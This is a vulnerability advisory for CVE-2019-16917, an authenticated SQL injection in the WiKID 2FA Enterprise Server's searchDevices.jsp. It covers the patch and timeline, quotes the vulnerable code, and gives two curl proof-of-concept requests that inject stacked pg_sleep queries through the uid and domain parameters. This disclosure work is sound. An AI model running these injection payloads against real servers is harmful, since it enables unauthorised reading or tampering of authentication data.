A SQL Injection vulnerability, CVE-2019-16917, was identified on `WiKID Systems 2FA Enterprise Server` through version `4.2.0-b2047`.  The <var>uid</var> and <var>domain</var> parameters, used by **searchDevices.jsp**, are not sanitized before being included in a SQL query thus allowing an authenticated user to create, read, update, or delete information in the database.  

## Patch

* **4.2.0.b2047**: <https://downloads.wikidsystems.com/wikid-server-enterprise-4.2.0.b2047-1.noarch.rpm>

## Timeline

* 14 Sep 2019 - Issue discovered on `WiKID Systems 2FA Enterprise Server 4.2.0-b2032` and disclosed to WiKID Systems.
* 26 Sep 2019 - Issue confirmed by WiKID Systems, Patch Released
* 16 Oct 2019 - Public Disclosure

## Description

The source for **searchDevices.jsp** reveals the `buildSearchWhereClause`.  The <var>uid</var> and <var>domain</var> parameters are retrieved in the `buildSearchWhereClause` function:

~~~
191     private void buildSearchWhereClause(HttpServletRequest request) {
192         where = "";
193         String uid=request.getParameter("uid");
194         String domain=request.getParameter("domain");
~~~

### domain parameter

If the <var>domain</var> parameter is set and <var>uid</var> parameter is not set, <var>domain</var> is included in a query thus allowing SQL injection here:

~~~
203         }else if(!domain.equals("0") && uid==null){
204             where="where domainid="+domain;
~~~

If the <var>uid</var> parameter is set, the <var>domain</var> parameter is included in a query thus allowing SQL injection here:

~~~
205         }else if(uid!=null){
...
214             if(!domain.equals("0")){
215                 where=where+" and domainid="+domain;
216             }
217         }
218     }
~~~

The backend database is Postgres, which supports Stacked Queries.  A value such as `1; select pg_sleep(10);--` will demonstrate the issue the first query will execute followed by a second query instructing the database to sleep; the database and application will hang for 10+ seconds:

~~~{.sh}
SLEEP=10; HOST=$RHOST; COOKIE=$COOKIE; time curl -v -i -s -k  -X 'POST' -H "Host: $HOST" -H "Cookie: JSESSIONID=$COOKIE;" --data-binary "uid=test&domain=1;select pg_sleep($SLEEP);--&action=Search" https://$HOST/WiKIDAdmin/searchDevices.jsp
~~~

### uid parameter

If the <var>uid</var> parameter is set, the logic drops down to following logic where the <var>uid</var> parameter is included in the query:

~~~
205         }else if(uid!=null){
206             uid=uid.toLowerCase().trim();
207             String ask=uid.substring(uid.length()-1);
208             if(ask!=null ){
209 //                uid=uid.substring(0,uid.length()-1);
210                 where="where RTRIM(LOWER(userid)) like LOWER('%"+uid+"%')";
211 //            }else{
212 //                where="where RTRIM(LOWER(userid))=LOWER('"+uid+"')";
213             }
~~~

A request, such as the following, will trigger the issue, causing the application to delay for 10+ seconds:

~~~{.sh}
SLEEP=10; HOST=$RHOST; COOKIE=$COOKIE; time curl -v -i -s -k  -X 'POST' -H "Host: $HOST" -H "Cookie: JSESSIONID=$COOKIE;" --data-binary "uid=1;select pg_sleep($SLEEP);--&action=Search" https://$HOST/WiKIDAdmin/searchDevices.jsp
~~~
